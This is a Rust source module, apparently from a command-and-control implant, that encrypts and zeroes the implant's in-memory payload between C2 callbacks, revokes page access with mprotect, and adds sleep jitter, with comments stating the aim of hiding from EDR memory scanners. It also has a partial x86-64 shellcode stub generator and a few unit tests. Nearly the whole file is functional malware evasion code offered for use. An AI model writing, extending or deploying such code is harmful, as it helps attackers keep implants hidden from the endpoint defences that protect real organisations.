//! Sleep obfuscation — encrypt payload in memory during sleep intervals.
//!
//! When the agent is sleeping between C2 callbacks, the payload and
//! sensitive data sits in memory as plaintext — scannable by EDR.
//! Sleep obfuscation encrypts the memory region before sleeping
//! and decrypts it upon waking, so memory scanners see only ciphertext.

use crate::crypto;
use rand::RngCore;

/// Sleep obfuscation configuration
#[derive(Debug, Clone)]
pub struct SleepObfConfig {
    /// Encrypt heap allocations during sleep
    pub encrypt_heap: bool,
    /// Encrypt stack (more complex, requires careful handling)
    pub encrypt_stack: bool,
    /// Change memory permissions during sleep (RW→NoAccess→RW)
    pub change_permissions: bool,
    /// Spoof the call stack during sleep (make it look like a legitimate wait)
    pub spoof_callstack: bool,
    /// Jitter factor for the sleep duration
    pub jitter_pct: f64,
}

impl Default for SleepObfConfig {
    fn default() -> Self {
        Self {
            encrypt_heap: true,
            encrypt_stack: false,
            change_permissions: true,
            spoof_callstack: false,
            jitter_pct: 0.3,
        }
    }
}

/// Region of memory to protect during sleep
#[derive(Debug, Clone)]
pub struct ProtectedRegion {
    /// Starting address
    pub addr: usize,
    /// Size in bytes
    pub size: usize,
    /// Encrypted backup of the region
    pub encrypted_backup: Option<Vec<u8>>,
    /// Key used for encryption
    pub key: crypto::EncryptionKey,
}

impl ProtectedRegion {
    pub fn new(addr: usize, size: usize) -> Self {
        let key = crypto::generate_key();
        Self {
            addr,
            size,
            encrypted_backup: None,
            key,
        }
    }

    /// Encrypt the memory region and store the backup.
    /// The original memory is zeroed after encryption.
    ///
    /// # Safety
    /// The caller must ensure the memory region is valid and writable.
    #[cfg(target_os = "linux")]
    pub unsafe fn encrypt(&mut self) -> Result<(), String> {
        let slice = std::slice::from_raw_parts(self.addr as *const u8, self.size);
        let encrypted = crypto::encrypt(&self.key, slice)
            .map_err(|e| format!("encrypt: {e}"))?;
        self.encrypted_backup = Some(encrypted);

        // Zero the original memory
        std::ptr::write_bytes(self.addr as *mut u8, 0, self.size);

        Ok(())
    }

    /// Decrypt and restore the memory region from backup.
    ///
    /// # Safety
    /// The caller must ensure the memory region is valid and writable.
    #[cfg(target_os = "linux")]
    pub unsafe fn decrypt(&mut self) -> Result<(), String> {
        let backup = self.encrypted_backup.take()
            .ok_or("no encrypted backup to restore")?;
        let plaintext = crypto::decrypt(&self.key, &backup)
            .map_err(|e| format!("decrypt: {e}"))?;

        if plaintext.len() != self.size {
            return Err(format!(
                "size mismatch: expected {}, got {}", self.size, plaintext.len()
            ));
        }

        std::ptr::copy_nonoverlapping(
            plaintext.as_ptr(),
            self.addr as *mut u8,
            self.size,
        );

        // Rotate the key for next sleep cycle
        self.key = crypto::generate_key();

        Ok(())
    }
}

/// Perform an obfuscated sleep: encrypt regions, sleep, decrypt.
///
/// This is the high-level API used by the agent's main loop.
///
/// # Safety
/// Protected regions must point to valid, writable memory.
#[cfg(target_os = "linux")]
pub unsafe fn obfuscated_sleep(
    duration: std::time::Duration,
    regions: &mut [ProtectedRegion],
    config: &SleepObfConfig,
) {
    // 1. Encrypt all protected regions
    for region in regions.iter_mut() {
        if config.encrypt_heap {
            if let Err(e) = region.encrypt() {
                log::warn!("sleep obfuscation encrypt failed: {e}");
            }
        }
    }

    // 2. Optionally change memory permissions to PAGE_NOACCESS
    if config.change_permissions {
        for region in regions.iter() {
            let _ = libc::mprotect(
                region.addr as *mut libc::c_void,
                region.size,
                libc::PROT_NONE,
            );
        }
    }

    // 3. Apply jitter to sleep duration
    let jitter = if config.jitter_pct > 0.0 {
        let mut rng = rand::rngs::OsRng;
        let jitter_range = duration.as_secs_f64() * config.jitter_pct;
        let offset = (rng.next_u32() as f64 / u32::MAX as f64) * 2.0 * jitter_range - jitter_range;
        std::time::Duration::from_secs_f64(
            (duration.as_secs_f64() + offset).max(0.1)
        )
    } else {
        duration
    };

    // 4. Sleep
    std::thread::sleep(jitter);

    // 5. Restore memory permissions
    if config.change_permissions {
        for region in regions.iter() {
            let _ = libc::mprotect(
                region.addr as *mut libc::c_void,
                region.size,
                libc::PROT_READ | libc::PROT_WRITE,
            );
        }
    }

    // 6. Decrypt all protected regions
    for region in regions.iter_mut() {
        if config.encrypt_heap {
            if let Err(e) = region.decrypt() {
                log::warn!("sleep obfuscation decrypt failed: {e}");
            }
        }
    }
}

/// Generate a timer-based sleep obfuscation stub (shellcode).
/// Uses Linux timer_create + signal handler to perform the encrypt/decrypt cycle.
pub fn generate_sleep_obf_stub() -> Vec<u8> {
    // This stub:
    // 1. Sets up a signal handler that decrypts the protected region
    // 2. Encrypts the region
    // 3. Calls nanosleep
    // 4. Signal handler fires on wake, decrypts
    //
    // Simplified representation — full implementation would include
    // the signal handler setup and XOR key management in shellcode.
    let mut stub = Vec::new();

    // XOR key rotation during sleep (16-byte key on stack)
    stub.extend_from_slice(&[
        0x48, 0x83, 0xEC, 0x10,              // sub rsp, 16 (key space)
        // Generate random key via getrandom(2)
        0x48, 0x89, 0xE7,                    // mov rdi, rsp (buf)
        0x48, 0xC7, 0xC6, 0x10, 0x00, 0x00, 0x00, // mov rsi, 16 (buflen)
        0x48, 0x31, 0xD2,                    // xor rdx, rdx (flags=0)
        0x48, 0xC7, 0xC0, 0x3E, 0x01, 0x00, 0x00, // mov rax, 318 (getrandom)
        0x0F, 0x05,                            // syscall
    ]);

    // Placeholder for encrypt/nanosleep/decrypt sequence
    stub.extend_from_slice(&[
        0x48, 0x83, 0xC4, 0x10,              // add rsp, 16 (cleanup key)
        0xC3,                                  // ret
    ]);

    stub
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sleep_obf_stub_generation() {
        let stub = generate_sleep_obf_stub();
        assert!(!stub.is_empty());
        // Should contain a syscall for getrandom
        assert!(stub.windows(2).any(|w| w == [0x0F, 0x05]));
    }

    #[test]
    fn test_protected_region_creation() {
        let region = ProtectedRegion::new(0x1000, 4096);
        assert_eq!(region.addr, 0x1000);
        assert_eq!(region.size, 4096);
        assert!(region.encrypted_backup.is_none());
    }

    #[test]
    fn test_sleep_obf_config_default() {
        let config = SleepObfConfig::default();
        assert!(config.encrypt_heap);
        assert!(!config.encrypt_stack);
        assert!(config.change_permissions);
    }
}
